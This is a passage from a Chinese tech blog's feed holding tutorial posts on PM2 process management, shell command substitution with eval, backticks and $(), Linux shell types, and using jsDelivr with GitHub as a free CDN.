class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这两种方式都可以创建管理应用，作用都是一样的，区别只是：一个是<code>json</code>格式的配置文件，一个是<code>js</code>格式的配置文件。</p><p>上面是一个最简单的<code>processes.json</code>配置，创建了一个<code>myApp</code>应用，如果你有多个服务，那么<code>apps</code> 这个数组中创建多个应用。</p><blockquote><p>创建好配置文件之后，那么该如何启动呢？</p></blockquote><p>有两种方式：</p><ol><li>直接调用配置文件启动</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 start processes.json</span><br></pre></td></tr></table></figure><p>可以增加<code>--env</code>参数，来指定当前启动环境。</p><ol start="2"><li>通过<code>package.json</code> 配置文件，配置脚本启动</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; package.json</span><br><span class="line"></span><br><span class="line">&quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;start&quot;: &quot;node server&#x2F;index&quot;,</span><br><span class="line">    &quot;pm2&quot;: &quot;pm2 start processes.json&quot;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>然后就可以直接使用<code>npm start pm2</code> 来启动应用了。</p><h4 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h4><p>在配置文件你可以指定环境变量、日志文件、进程文件，重启最大次数…等配置项。支持JSON和YAML格式。</p><p>PM2 的配置支持非常多的参数，下面会对常用的参数一一做说明。</p><table><thead><tr><th>字段</th><th>类型</th><th>值</th><th>描述</th></tr></thead><tbody><tr><td>name</td><td>string</td><td>myApp</td><td>应用的名字，默认是脚本文件名</td></tr><tr><td>cwd</td><td>string</td><td>/var/www/myApp</td><td>应用程序所在目录</td></tr><tr><td>script</td><td>string</td><td>./server.js</td><td>应用程序的脚本路径，相对于应用程序所在目录</td></tr><tr><td>log_date_format</td><td>string</td><td>YYYY-MM-DD HH:mm Z</td><td>日志时间格式</td></tr><tr><td>error_file</td><td>string</td><td>-</td><td>错误日志存放路径</td></tr><tr><td>out_file</td><td>string</td><td>-</td><td>输出日志存放路径</td></tr><tr><td>pid_file</td><td>string</td><td>-</td><td>pid文件路径</td></tr><tr><td>watch</td><td>boolean or array</td><td>true</td><td>当目录文件或子目录文件有变化时自动重新加载应用</td></tr><tr><td>ignore_watch</td><td>list</td><td>[”[/]./”, “node_modules”]</td><td>list中的正则匹配的文件和目录有变化时不重新加载应用</td></tr><tr><td>max_memory_restart</td><td>string</td><td>50M</td><td>当应用超过设定的内存大小就自动重启</td></tr><tr><td>min_uptime</td><td>string</td><td>60s</td><td>最小运行时间，这里设置的是60s即如果应用程序在60s内退出，pm2会认为程序异常退出，此时触发重启max_restarts设置数量</td></tr><tr><td>max_restarts</td><td>number</td><td>10</td><td>设置应用程序异常退出重启的次数，默认15次（从0开始计数）</td></tr><tr><td>instances</td><td>number</td><td>1</td><td>启动实例个数</td></tr><tr><td>cron_restart</td><td>string</td><td>1 0 * * *</td><td>定时重启</td></tr><tr><td>exec_interpreter</td><td>string</td><td>node</td><td>应用程序的脚本类型，默认是node</td></tr><tr><td>exec_mode</td><td>string</td><td>fork</td><td>应用启动模式，支持fork和cluster模式，默认为fork</td></tr><tr><td>autorestart</td><td>boolean</td><td>true</td><td>应用程序崩溃或退出时自动重启</td></tr></tbody></table><p>有以下几点需要注意 ⚠️：</p><ol><li>如果<code>processes.json</code>或者<code>ecosystem.config.js</code> 配置文件如果发生了变化，建议直接删除应用之后，重新创建，否则可能部分配置不会生效。</li><li><code>cwd</code> 不要填绝对路径，建议用相对路径，<code>./</code>表示相对于配置文件根目录，否则可能会出现静态资源丢失的情况。</li></ol><h3 id="进程监控"><a href="#进程监控" class="headerlink" title="进程监控"></a>进程监控</h3><p>列出所有节点应用程序（进程/微服务）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 list</span><br><span class="line">$ pm2 ls</span><br></pre></td></tr></table></figure><p>可以将进程列表以JSON格式打印出来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 jlist</span><br><span class="line">$ pm2 prettylist</span><br></pre></td></tr></table></figure><p>使用进程ID或名称查看所示的单个Node进程的详细信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 describe &lt;id | app_name&gt;</span><br><span class="line">$ pm2 show &lt;id | app_name&gt;</span><br></pre></td></tr></table></figure><p>实时监控所有进程CPU或内存使用情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 monit</span><br></pre></td></tr></table></figure><h3 id="日志管理"><a href="#日志管理" class="headerlink" title="日志管理"></a>日志管理</h3><p>查看某个应用的日志：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 logs [&#39;all&#39; | app_name | app_id ]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 logs --json         # JSON 格式输出</span><br><span class="line">$ pm2 logs --format       # 格式化 output</span><br><span class="line">$ pm2 flush               # 清空所有日志文件</span><br><span class="line">$ pm2 reloadLogs          # 重新加载所有日志文件</span><br></pre></td></tr></table></figure><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>停止进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 stop [&#39;all&#39; | app_name | app_id ]</span><br></pre></td></tr></table></figure><p>重启进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 restart [&#39;all&#39; | app_name | app_id ]</span><br></pre></td></tr></table></figure><p>0秒停机重载进程 (用于 NETWORKED 进程)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 reload all</span><br></pre></td></tr></table></figure><p>杀死进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pm2 delete [&#39;all&#39; | app_name | app_id ]</span><br></pre></td></tr></table></figure><h3 id="使用PM2-运行-npm-start"><a href="#使用PM2-运行-npm-start" class="headerlink" title="使用PM2 运行 npm start"></a>使用PM2 运行 npm start</h3><p><code>npm run xxxx</code> 是 node常用的启动方式之一，那么如何使用<code>PM2</code>来实现对该方式的启动呢？</p><p><code>npm run</code>、<code>npm start</code>等命令之所以可以使用，是因为<code>package.json</code>配置文件中增加了对应的脚本命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;start-dev&quot;: &quot;env $(cat .env | xargs) nodemon server&#x2F;index&quot;,</span><br><span class="line">    &quot;start&quot;: &quot;node server&#x2F;index&quot;,</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm2 start npm --watch --name &lt;taskname&gt; -- run &lt;scriptname&gt;;</span><br></pre></td></tr></table></figure><p>其中 <code>--watch</code>监听代码变化，<code>--name</code>重命名任务名称，<code>-- run</code>后面跟脚本名字</p><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 等效于 npm start</span><br><span class="line">pm2 start npm --watch --name webserver -- run start</span><br></pre></td></tr></table></figure><h3 id="稳定运行"><a href="#稳定运行" class="headerlink" title="稳定运行"></a>稳定运行</h3><p>PM2 是一款非常优秀的 Node 进程管理工具，它有着丰富的特性，能够充分利用多核CPU且能够负载均衡、能够帮助应用在崩溃后、指定时间(cluster model)和超出最大内存限制等情况下实现自动重启。</p><p>为了保证能够稳定运行，可以参考以下几点建议：</p><ol><li>应用进程运行时间久了或许总会产生一些意料之外的问题，定时重启可以规避一些不可测的情况；</li><li>最大内存限制，根据观察设定合理内存限制，保证应用异常运行；</li><li><code>min_uptime</code>，<code>min_uptime</code> 是应用正常启动的最小持续运行时长，合理设置设置此范围，可以将超出时间判定为异常启动；</li><li>设定异常重启延时restart_delay，对于异常情况导致应用停止，设定异常重启延迟可防止应用在不可测情况下不断重启的导致重启次数过多等问题；</li><li>设置异常重启次数，如果应用不断异常重启，并超过一定的限制次数，说明此时的环境长时间处于不可控状态，服务器异常。此时便可停止尝试，发出错误警告通知等。</li></ol><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.kancloud.cn/daiji/pm2/395273" target="_blank" rel="noopener">pm2 从入门到精通</a></li><li><a href="https://www.linuxidc.com/Linux/2019-07/159432.htm" target="_blank" rel="noopener">如何在生产服务器上安装PM2运行Node.js应用程序</a></li><li><a href="https://futurestud.io/tutorials/pm2-advanced-app-configuration-with-json-file" target="_blank" rel="noopener">PM2 配置文件说明解析</a></li><li><a href="https://pm2.keymetrics.io/docs/usage/application-declaration/" target="_blank" rel="noopener">PM2 应用配置文件解析</a></li><li><a href="https://fynn90.github.io/2018/01/11/PM2%E5%AE%9E%E7%94%A8%E6%89%8B%E5%86%8C/#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4" target="_blank" rel="noopener">PM2 实用手册</a></li><li><a href="https://www.cnblogs.com/cangqinglang/p/10676162.html" target="_blank" rel="noopener">PM2 用法详解</a></li><li><a href="https://juejin.im/post/5b823506e51d4538d517662f#heading-5" target="_blank" rel="noopener">使用pm2 自动部署node项目</a></li><li><a href="https://blog.windstone.cc/back-end/node/pm2.html#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4" target="_blank" rel="noopener">PM2 中文文档</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;http://pm2.keymetrics.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;PM2&lt;/a&gt; 是Node.js 生产环境中的进程管理工具，自带负载均衡功能。&lt;/p&gt;</summary>
    
    
    
    <category term="Node" scheme="https://www.0x2beace.com/categories/Node/"/>
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/Node/Tutorial/"/>
    
    <category term="进程管理" scheme="https://www.0x2beace.com/categories/Node/Tutorial/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="Node" scheme="https://www.0x2beace.com/tags/Node/"/>
    
    <category term="PM2" scheme="https://www.0x2beace.com/tags/PM2/"/>
    
    <category term="进程管理" scheme="https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Linux 中的eval、反引号、$()的区别</title>
    <link href="https://www.0x2beace.com/the-difference-between-eval-and-backquotes-in-linux-and/"/>
    <id>https://www.0x2beace.com/the-difference-between-eval-and-backquotes-in-linux-and/</id>
    <published>2020-07-11T12:41:10.000Z</published>
    <updated>2020-07-11T12:46:46.350Z</updated>
    
    <content type="html"><![CDATA[<p>之前在搭建 SSH 环境时，遇到了这样一个问题：</p><blockquote><p>使用命令：<code>eval$(ssh-agent)</code>去创建一个代理进程，但是会提示：<code>No Such file or directory</code> 。</p></blockquote><p>就很纳闷，之前都用着好好的，为什么在新的环境中就不行了？</p><p>后来，了解到原来一直使用的 <code>eval$(ssh-agent)</code> ，其中的<code>$()</code> 原来在<code>Linux</code>中有特殊的意义。</p><p>所以这篇笔记专门用来了解 <code>eval</code> 和 <code>反引号</code> 以及 <code>$()</code>之间的区别。 它们的作用都是<strong>命令替换</strong>。</p><a id="more"></a><h2 id="场景重现"><a href="#场景重现" class="headerlink" title="场景重现"></a>场景重现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ &#96;ssh-agent&#96;</span><br><span class="line">sh.exe&quot;: SSH_AUTH_SOCK&#x3D;&#x2F;tmp&#x2F;ssh-myYvgp1404&#x2F;agent.1404;: No such file or directory</span><br><span class="line"></span><br><span class="line">$ eval ssh-agent</span><br><span class="line">SSH_AUTH_SOCK&#x3D;&#x2F;tmp&#x2F;ssh-zIQZKN6080&#x2F;agent.6080; export SSH_AUTH_SOCK;</span><br><span class="line">SSH_AGENT_PID&#x3D;1092; export SSH_AGENT_PID;</span><br><span class="line">echo Agent pid 1092;</span><br><span class="line"></span><br><span class="line">$ eval &#96;ssh-agent&#96;</span><br><span class="line">Agent pid 4288</span><br></pre></td></tr></table></figure><p>直到我输入 eval <code>ssh-agent</code> 时，似乎就对了。</p><h3 id="命令代换"><a href="#命令代换" class="headerlink" title="命令代换"></a>命令代换</h3><p>这三种不同的方式都是<code>shell</code>脚本中的命令代换。</p><p>命令代换是指<code>shell</code>能够将一个命令的标准输出插在一个命令行中任何位置。</p><h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><p>首先要介绍的是: <code>eval</code></p><p>它的作用是：<strong>重新运算求出参数的内容</strong>。</p><p>该命令使用于那些一次扫描无法实现其功能的变量。该命令对变量进行两次扫描。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ touch test.txt</span><br><span class="line">$ vim test.txt      </span><br><span class="line">&#x2F;&#x2F; 写入 Hello eval</span><br><span class="line"></span><br><span class="line">$ var&#x3D;&quot;cat test.txt&quot;</span><br><span class="line">&#x2F;&#x2F; 注意：中间没有空格，前面没有美元符号。</span><br><span class="line"></span><br><span class="line">$ echo $var</span><br><span class="line">cat test.txt</span><br><span class="line">$ eval $var</span><br><span class="line">Hello eval</span><br></pre></td></tr></table></figure><h4 id="反引号与"><a href="#反引号与" class="headerlink" title="反引号与 $()"></a>反引号与 $()</h4><p>实例一：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ DATE1&#x3D;$(date)</span><br><span class="line">$ DATE2&#x3D;&#96;date&#96;</span><br><span class="line">$ DATE3&#x3D;&#96;eval date&#96;</span><br><span class="line"></span><br><span class="line">$ echo $DATE1</span><br><span class="line">2019年01月23日 21:20:36</span><br><span class="line">$ echo $DATE2</span><br><span class="line">2019年01月23日 21:20:36</span><br><span class="line">$ echo $DATE3</span><br><span class="line">2019年01月23日 21:20:36</span><br></pre></td></tr></table></figure><p>实例二：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ echo &#96;echo &#39;\\&#39;&#96; </span><br><span class="line">\</span><br><span class="line">$ echo $(echo &#39;\\&#39;)</span><br><span class="line">\\</span><br></pre></td></tr></table></figure><p>暂时没太明白这三者的实际应用场景，不过了解到了 它们之间的一些区别与联系。</p><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><ul><li><a href="https://kyle.io/2012/09/ssh-agent-messiness-solving-it/" target="_blank" rel="noopener">https://kyle.io/2012/09/ssh-agent-messiness-solving-it/</a></li><li><a href="https://blog.csdn.net/Y1730008223CONG/article/details/74136055" target="_blank" rel="noopener">shell脚本中命令代换：反引号、$()、eval区别</a></li><li><a href="https://blog.csdn.net/if9600/article/details/74221548" target="_blank" rel="noopener">shell脚本中命令代换：反引号、$()、eval区别2</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;之前在搭建 SSH 环境时，遇到了这样一个问题：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;使用命令：&lt;code&gt;eval$(ssh-agent)&lt;/code&gt;去创建一个代理进程，但是会提示：&lt;code&gt;No Such file or directory&lt;/code&gt; 。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;就很纳闷，之前都用着好好的，为什么在新的环境中就不行了？&lt;/p&gt;
&lt;p&gt;后来，了解到原来一直使用的 &lt;code&gt;eval$(ssh-agent)&lt;/code&gt; ，其中的&lt;code&gt;$()&lt;/code&gt; 原来在&lt;code&gt;Linux&lt;/code&gt;中有特殊的意义。&lt;/p&gt;
&lt;p&gt;所以这篇笔记专门用来了解 &lt;code&gt;eval&lt;/code&gt; 和 &lt;code&gt;反引号&lt;/code&gt; 以及 &lt;code&gt;$()&lt;/code&gt;之间的区别。 它们的作用都是&lt;strong&gt;命令替换&lt;/strong&gt;。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="学习笔记" scheme="https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Shell" scheme="https://www.0x2beace.com/tags/Shell/"/>
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux 中的Shell 种类</title>
    <link href="https://www.0x2beace.com/shell-types-in-linux/"/>
    <id>https://www.0x2beace.com/shell-types-in-linux/</id>
    <published>2020-07-11T12:36:46.000Z</published>
    <updated>2020-07-11T12:41:49.331Z</updated>
    
    <content type="html"><![CDATA[<p>什么是Shell？</p><a id="more"></a><p>Shell 是一个程序，其作用是将用户输入的命令发送到OS（系统内核）。</p><p>据说它起源于作为存在于OS 内部和用户之间的外壳的依附着。所以为形象的称作为 壳（Shell）。</p><h2 id="Shell-的种类"><a href="#Shell-的种类" class="headerlink" title="Shell 的种类"></a>Shell 的种类</h2><p>Linux Shell 的种类很多，目前流行的Shell 包括ash、bash、ksh、csh、zsh等，种类多了，也就有了标准化的要求，这就是POSIX的由来。</p><p>POSIX 表示可移植操作系统接口（UNIX的可移植操作系统接口，缩写为POSIX），POSIX标准定义了操作系统应该为应用程序提供的接口标准。</p><p>通过以下命令来查看文件中的内容来查看自己主机中当前有哪些种类的Shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;etc&#x2F;shells</span><br><span class="line">&#x2F;bin&#x2F;sh</span><br><span class="line">&#x2F;bin&#x2F;bash</span><br><span class="line">&#x2F;bin&#x2F;ksh</span><br><span class="line">&#x2F;bin&#x2F;pdksh</span><br><span class="line">&#x2F;bin&#x2F;tcsh</span><br><span class="line">&#x2F;bin&#x2F;zsh</span><br><span class="line">&#x2F;bin&#x2F;dash</span><br><span class="line">&#x2F;bin&#x2F;posh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;bash</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;ksh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pdksh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;tcsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;zsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;dash</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;posh</span><br></pre></td></tr></table></figure><p>如何查看当前正在使用的Shell 类型：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo $SHELL</span><br><span class="line">&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p><code>$SHELL</code>是一个环境变量，它记录了Linux 当前用户所使用的Shell类型。</p><p>用户可以通过直接输入各种Shell的二进制文件名（因为这些二进制文件本身是可以被执行的），来进入到该Shell下，比如进入<code>zsh</code>可以直接输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ &#x2F;bin&#x2F;zsh</span><br></pre></td></tr></table></figure><p>这个命令为用户又启动了一个Shell，这个Shell在最初登录的那个Shell之后，称为下级的Shell或子Shell。</p><h2 id="最标准的Shell"><a href="#最标准的Shell" class="headerlink" title="最标准的Shell"></a>最标准的Shell</h2><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><p><code>sh</code>是Unix 上最古老的Shell，在<code>sh</code>的基础上添加了各种扩展功能的是<code>bash</code>，它成为Linux标准Shell。有如下的特点：</p><ul><li>使用上下键快速查看历史命令</li><li>Tab 键自动补全</li></ul><h2 id="其他Shell"><a href="#其他Shell" class="headerlink" title="其他Shell"></a>其他Shell</h2><h3 id="ash"><a href="#ash" class="headerlink" title="ash"></a>ash</h3><p><code>ash</code>是Linux 中占用系统资源最少的一个小Shell，它只包含24个内部命令，因而使用起来很不方便。</p><h3 id="csh"><a href="#csh" class="headerlink" title="csh"></a>csh</h3><p><code>csh</code>是Linux 比较大的内核，共有52个内部命令。该Shell其实是指向/bin/tcsh这样的一个Shell，也就是说，csh其实就是tcsh。</p><h3 id="zsh"><a href="#zsh" class="headerlink" title="zsh"></a>zsh</h3><p>zch是Linux 最大的Shell之一，共有84 个内部命令。 zsh具有如下特性：</p><ul><li>更好的自动补全、更高效</li><li>更好的文件名展开（通配符展开）</li><li>可定制性高</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://academy.gmocloud.com/keywords/20170324/4010" target="_blank" rel="noopener">什么是Shell以及常见Shell种类</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;什么是Shell？&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    <category term="学习笔记" scheme="https://www.0x2beace.com/categories/Linux/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Shell" scheme="https://www.0x2beace.com/tags/Shell/"/>
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>免费 CDN：JsDelivr + Github</title>
    <link href="https://www.0x2beace.com/free-cdn-jsdelivr-github/"/>
    <id>https://www.0x2beace.com/free-cdn-jsdelivr-github/</id>
    <published>2020-07-10T05:32:43.000Z</published>
    <updated>2020-07-10T05:34:57.891Z</updated>
    
    <content type="html"><![CDATA[<p>不知道大家通常是如何访问图床的，我之前一直使用的方式是：<code>GitHub</code> 图床 + <code>raw.githubusercontent</code>。</p><p>图片相关的资源全部放在<code>GitHub</code>上，然后使用GitHub 提供的素材服务器<code>raw.githubusercontent</code>去访问。但是这种方式存在一个问题，那就是放在 Github 的资源在国内加载速度比较慢，如果网络稍微差一些，资源可能就会加载失败。</p><p>因此需要使用 CDN 来加速来优化资源加载速度。</p><a id="more"></a><h2 id="CDN-是什么"><a href="#CDN-是什么" class="headerlink" title="CDN 是什么"></a>CDN 是什么</h2><blockquote><p>CDN的全称是<code>Content Delivery Network</code>，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。——百度百科</p></blockquote><p>由于某些原因，很多公用免费的 CDN 资源在中国大陆并不很好用，就算是付费的，也有一定的限制，例如每天的刷新次数有限之类的。<br>幸运的是在中国大陆唯一有 license 的公有 CDN竟然是免费的，它就是——<a href="https://www.jsdelivr.com/" target="_blank" rel="noopener">JsDelivr</a>。</p><h2 id="JsDelivr-是什么"><a href="#JsDelivr-是什么" class="headerlink" title="JsDelivr 是什么"></a>JsDelivr 是什么</h2><blockquote><p>A free CDN for Open Source fast, reliable, and automated. —— JsDelivr 官网</p></blockquote><p>根据官网的介绍我们可以知道它是一个<strong>免费</strong>、<strong>快速</strong>、<strong>可靠</strong>、<strong>自动化</strong> 的CDN。</p><p>那么，这么棒的CDN，到底该如何使用呢？下面会一一介绍。</p><h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><p>JsDelivr 目前有三种用法：</p><ul><li>Npm</li><li>Github</li><li>Wordpress</li></ul><p>因为本文的重点是如何使用 GitHub + JsDelivr，来搭建免费的CDN，所以这里就不对其他两种用法做过多介绍。</p><h3 id="1-新建Github-仓库"><a href="#1-新建Github-仓库" class="headerlink" title="1. 新建Github 仓库"></a>1. 新建Github 仓库</h3><p>这个仓库是用于存储资源文件的，最好是public，因为private的仓库，资源链接会带token验证，而这个token会存在过期的问题。</p><h3 id="2-将本地资源推送至仓库"><a href="#2-将本地资源推送至仓库" class="headerlink" title="2. 将本地资源推送至仓库"></a>2. 将本地资源推送至仓库</h3><p>将资源文件加入本地仓库，然后推送至 CDN 的远程仓库。</p><h3 id="3-发布仓库"><a href="#3-发布仓库" class="headerlink" title="3. 发布仓库"></a>3. 发布仓库</h3><p>如果没有发布就直接使用，可能会导致文件加载异常。</p><p>自定义发布版本号：<br><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200710132805.png" alt=""></p><p>然后点击<code>Publish release</code>。</p><h3 id="4-通过jsDeliver引用资源"><a href="#4-通过jsDeliver引用资源" class="headerlink" title="4. 通过jsDeliver引用资源"></a>4. 通过jsDeliver引用资源</h3><p>只需要通过符合 JSDelivr 规则的 URL 引用，即可直接使用 Github 中的资源。</p><p>规则如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;username&#x2F;repository@version&#x2F;file</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li><code>cdn.jsdelivr.net/gh/</code>：jsDeliver 规定Github 的引用地址</li><li><code>username</code>：你的GitHub 用户名</li><li><code>repository</code>：CDN 仓库</li><li><code>@version</code>：发布的版本号</li><li><code>file</code>：资源文件在仓库中的路径</li></ul><p>版本号不是必需的，是为了区分新旧资源，如果不使用版本号，将会直接引用最新资源，除此之外还可以使用某个范围内的版本，查看所有资源等，具体使用方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 通过指定版本号引用</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;0xAiKang&#x2F;CDN&#x2F;blog&#x2F;images&#x2F;avatar.jpg</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 使用一个范围内的版本</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;dist&#x2F;jquery.min.js</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 忽略版本号则默认使用最新版</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery&#x2F;dist&#x2F;jquery.min.js</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 在任意JS&#x2F;CSS文件后添加 .min 能得到一个缩小版</span><br><span class="line">&#x2F;&#x2F; 如果它本身不存在，我们将会为你生成</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;src&#x2F;core.min.js</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 在末尾加 &#x2F; 则得到目录列表</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery&#x2F;</span><br></pre></td></tr></table></figure><p>同样的一张图片，可以对比一下<code>jsDeliver</code>和<code>raw.githubusercontent</code> 的访问速度。</p><ul><li><code>jsDeliver</code>：<a href="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/avatar.jpg" 